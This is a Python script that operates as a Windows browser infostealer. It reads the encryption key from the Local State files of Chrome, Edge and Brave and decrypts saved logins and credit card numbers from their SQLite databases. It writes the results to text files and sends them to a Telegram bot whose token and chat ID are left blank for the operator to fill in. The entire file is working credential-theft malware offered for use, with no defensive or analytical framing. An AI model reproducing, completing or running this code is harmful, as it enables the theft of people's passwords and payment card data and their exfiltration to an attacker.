import os
import base64
import json
import shutil
import sqlite3
from datetime import datetime, timedelta
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
import telepot

# Get the path of the local app data
appdata = os.getenv("LOCALAPPDATA")

# Define the paths of the different browsers
browsers = {
    "google-chrome-sxs": appdata + "\\Google\\Chrome SxS\\User Data",
    "google-chrome": appdata + "\\Google\\Chrome\\User Data",
    "microsoft-edge": appdata + "\\Microsoft\\Edge\\User Data",
    "brave": appdata + "\\BraveSoftware\\Brave-Browser\\User Data",
}

# Define the queries and information for different types of data
data_queries = {
    "login_data": {
        "query": "SELECT action_url, username_value, password_value FROM logins",
        "file": "\\Login Data",
        "columns": ["URL", "Email", "Password"],
        "decrypt": True,
    },
    "credit_cards": {
        "query": "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards",
        "file": "\\Web Data",
        "columns": ["Name On Card", "Card Number", "Expires On", "Added On"],
        "decrypt": True,
    },
}


# Function to get the master key for decryption
def get_master_key(path: str):
    if not os.path.exists(path):
        return
    if "os_crypt" not in open(path + "\\Local State", "r", encoding="utf-8").read():
        return
    with open(path + "\\Local State", "r", encoding="utf-8") as f:
        c = f.read()
    local_state = json.loads(c)
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    key = CryptUnprotectData(key, None, None, None, 0)[1]
    return key


# Function to decrypt the password
def decrypt_password(buff: bytes, key: bytes) -> str:
    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)
    decrypted_pass = decrypted_pass[:-16].decode()
    return decrypted_pass


# Function to save the results to a file
def save_results(browser_name, type_of_data, content):
    if not os.path.exists(browser_name):
        os.mkdir(browser_name)
    if content is not None:
        file_path = f"{browser_name}/{type_of_data}.txt"
        with open(file_path, "w", encoding="utf-8") as file:
            file.write(content)
        print(f"\t [*] Saved in {file_path}")
    else:
        print(f"\t [-] No Data Found!")


# Function to get the data from the database
def get_data(path: str, profile: str, key, type_of_data):
    db_file = f'{path}\\{profile}{type_of_data["file"]}'
    if not os.path.exists(db_file):
        return
    result = ""
    shutil.copy(db_file, "temp_db")
    conn = sqlite3.connect("temp_db")
    cursor = conn.cursor()
    cursor.execute(type_of_data["query"])
    for row in cursor.fetchall():
        row = list(row)
        if type_of_data["decrypt"]:
            for i in range(len(row)):
                if isinstance(row[i], bytes):
                    row[i] = decrypt_password(row[i], key)
        if type_of_data == "history":
            if row[2] != 0:
                row[2] = convert_chrome_time(row[2])
            else:
                row[2] = "0"
        result += (
            "\n".join(
                [f"{col}: {val}" for col, val in zip(type_of_data["columns"], row)]
            )
            + "\n\n"
        )
    conn.close()
    os.remove("temp_db")
    return result


# Function to convert Chrome time to a readable format
def convert_chrome_time(chrome_time):
    return (datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)).strftime(
        "%d/%m/%Y %H:%M:%S"
    )


# Function to check which browsers are installed
def installed_browsers():
    available = []
    for x in browsers.keys():
        if os.path.exists(browsers[x]):
            available.append(x)
    return available


# Function to send a message to Telegram
def send_telegram_message(bot_token, chat_id, message):
    bot = telepot.Bot(bot_token)
    max_message_length = 4000  # Maximum length of a Telegram message
    # Check the length of the message, if it exceeds the limit
    if len(message) > max_message_length:
        # Split the message into parts
        message_parts = [
            message[i : i + max_message_length]
            for i in range(0, len(message), max_message_length)
        ]
        # Send each part of the message to the Telegram bot
        for part in message_parts:
            bot.sendMessage(chat_id, part)
    else:
        # If the message is short enough, send it directly
        bot.sendMessage(chat_id, message)


if __name__ == "__main__":
    available_browsers = installed_browsers()
    chat_id = ""  # Replace with your Telegram chat ID
    bot_token = ""  # Replace with your Telegram bot token
    for browser in available_browsers:
        browser_path = browsers[browser]
        master_key = get_master_key(browser_path)
        print(f"Getting Stored Details from {browser}")
        for data_type_name, data_type in data_queries.items():
            print(f"\t [!] Getting {data_type_name.replace('_', ' ').capitalize()}")
            data = get_data(browser_path, "Default", master_key, data_type)
            if data:
                print(data)  # Display data to the console
                save_results(browser, data_type_name, data)  # Save data to a text file
                send_telegram_message(bot_token, chat_id, data)  # Send data to Telegram
            else:
                print("\t [-] No Data Found!")
            print("\t------\n")
    input("All passwords and credit cards saved. Press ENTER to exit...")
